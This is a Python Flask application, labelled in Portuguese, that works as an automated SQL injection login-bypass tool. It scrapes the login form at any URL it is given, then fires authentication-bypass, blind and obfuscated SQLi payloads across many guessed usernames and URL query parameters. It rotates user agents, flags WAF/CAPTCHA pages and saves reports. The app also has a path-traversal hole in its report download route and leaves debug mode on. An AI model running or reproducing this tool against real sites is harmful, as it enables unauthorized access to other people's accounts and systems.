from flask import Flask, request, render_template_string, redirect, url_for, send_file
import threading
import os
import requests
from bs4 import BeautifulSoup
import time
import csv
import json
import re
import random
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime

app = Flask(__name__)
RESULTS_DIR = "results"
os.makedirs(RESULTS_DIR, exist_ok=True)

# --- HTML TEMPLATES --- #
index_template = '''
<!doctype html>
<title>SQLi Tester</title>
<h2>SQLi Tester - Lucas Navarro</h2>
<form method=post>
  URL do formulário de login: <input type=text name=url size=60>
  <input type=submit value=Testar>
</form>
<a href="/results">Ver relatórios</a>
'''

results_template = '''
<!doctype html>
<title>Relatórios</title>
<h2>Relatórios disponíveis</h2>
<ul>
  {% for arquivo in arquivos %}
    <li><a href="{{ url_for('report', nome=arquivo) }}">{{ arquivo }}</a></li>
  {% endfor %}
</ul>
<a href="/">Voltar</a>
'''

# --- SQLi Logic --- #
payloads = [
    "' OR '1'='1", "' OR 1=1--", "' OR '1'='1' --", "' OR 1=1#", "' OR 1=1/*",
    "admin' --", "' OR '1'='1' /*", "\" OR \"\"=\"", "' OR ''='",
    # Blind
    "' AND SLEEP(5)--", "' AND 1=1--", "' AND 1=2--", "' OR EXISTS(SELECT * FROM users)--",
    # Obfuscados
    "%27%20OR%201%3D1--", "'/**/OR/**/1=1--", "/*!OR*/ 1=1--", "'-- -", "'--\n"
]

base_usernames = ["admin", "admin1", "root", "test", "user", "lucas", "navarro"]
usernames = []
for user in base_usernames:
    usernames.extend([user.lower(), user.upper(), user.capitalize()])

success_keywords = ["painel", "dashboard", "logout", "admin", "bem-vindo"]
error_keywords = ["sql", "syntax", "mysql", "warning", "error"]
waf_keywords = ["captcha", "cloudflare", "verifique", "protegido", "segurança"]

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)"
]

def extract_form_fields(html):
    soup = BeautifulSoup(html, 'html.parser')
    form = soup.find('form')
    if not form:
        return None, None, None, None, None
    action = form.get('action')
    method = form.get('method', 'post').lower()
    inputs = form.find_all('input')
    fields = {}
    user_field = pass_field = None
    for input_tag in inputs:
        name = input_tag.get('name')
        t = input_tag.get('type', 'text')
        if not name:
            continue
        if t in ['text', 'email'] and not user_field:
            user_field = name
        elif t == 'password' and not pass_field:
            pass_field = name
        fields[name] = input_tag.get('value', '')
    return action, method, fields, user_field, pass_field

def test_sqli(url, results_dir):
    session = requests.Session()
    session.headers['User-Agent'] = random.choice(user_agents)
    try:
        resp = session.get(url, timeout=10)
    except:
        return
    action, method, fields, user_field, pass_field = extract_form_fields(resp.text)
    if not all([action, user_field, pass_field]):
        return
    login_url = urljoin(url, action)
    resultados = []

    def testa_payload(user, payload, campo_alvo):
        data = fields.copy()
        data[user_field] = user
        data[pass_field] = user
        data[campo_alvo] = payload
        try:
            if method == 'post':
                r = session.post(login_url, data=data, timeout=7)
            else:
                r = session.get(login_url, params=data, timeout=7)
            conteudo = r.text.lower()
            sucesso = any(k in conteudo for k in success_keywords) or r.url != login_url
            erro_sql = any(k in conteudo for k in error_keywords)
            waf = any(k in conteudo for k in waf_keywords)
            status = []
            if sucesso: status.append("Login bem-sucedido")
            if erro_sql: status.append("Erro SQL")
            if waf: status.append("WAF/CAPTCHA")
            if not status: status.append("Sem resposta suspeita")
            resultados.append({"usuario": user, "campo": campo_alvo, "payload": payload, "status": status})
        except:
            pass

    threads = []
    for user in usernames:
        for payload in payloads:
            for campo_alvo in [user_field, pass_field]:
                t = threading.Thread(target=testa_payload, args=(user, payload, campo_alvo))
                t.start()
                threads.append(t)
    for t in threads:
        t.join()

    parsed_url = urlparse(url)
    qs = parse_qs(parsed_url.query)
    for param in qs:
        for payload in payloads:
            new_qs = qs.copy()
            new_qs[param] = payload
            query_string = "&".join(f"{k}={v}" for k, v in new_qs.items())
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"
            try:
                r = session.get(test_url, timeout=7)
                conteudo = r.text.lower()
                sucesso = any(k in conteudo for k in success_keywords)
                erro_sql = any(k in conteudo for k in error_keywords)
                status = []
                if sucesso: status.append("Login bem-sucedido")
                if erro_sql: status.append("Erro SQL")
                if not status: status.append("Sem resposta suspeita")
                resultados.append({"usuario": "(param URL)", "campo": param, "payload": payload, "status": status})
            except:
                continue

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    csv_path = os.path.join(results_dir, f"relatorio_{timestamp}.csv")
    json_path = os.path.join(results_dir, f"relatorio_{timestamp}.json")
    html_path = os.path.join(results_dir, f"relatorio_{timestamp}.html")

    with open(csv_path, "w", newline='', encoding='utf-8') as csvfile:
        writer = csv.DictWriter(csvfile, fieldnames=["usuario", "campo", "payload", "status"])
        writer.writeheader()
        for linha in resultados:
            linha["status"] = ", ".join(linha["status"])
            writer.writerow(linha)

    with open(json_path, "w", encoding='utf-8') as jsonfile:
        json.dump(resultados, jsonfile, indent=2, ensure_ascii=False)

    with open(html_path, "w", encoding="utf-8") as html:
        html.write("""
        <html><head><title>Relatório SQLi</title></head><body>
        <h2>Relatório SQLi - Lucas Navarro</h2>
        <table border=1 cellpadding=4 cellspacing=0>
        <tr><th>Usuário</th><th>Campo</th><th>Payload</th><th>Status</th></tr>
        """)
        for r in resultados:
            html.write(f"<tr><td>{r['usuario']}</td><td>{r['campo']}</td><td>{r['payload']}</td><td>{', '.join(r['status'])}</td></tr>")
        html.write("</table></body></html>")

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        url = request.form['url']
        thread = threading.Thread(target=test_sqli, args=(url, RESULTS_DIR))
        thread.start()
        return redirect(url_for('results'))
    return render_template_string(index_template)

@app.route('/results')
def results():
    arquivos = sorted(os.listdir(RESULTS_DIR), reverse=True)
    return render_template_string(results_template, arquivos=arquivos)

@app.route('/report/<nome>')
def report(nome):
    caminho = os.path.join(RESULTS_DIR, nome)
    return send_file(caminho)

if __name__ == '__main__':
    app.run(debug=True, port=5000)
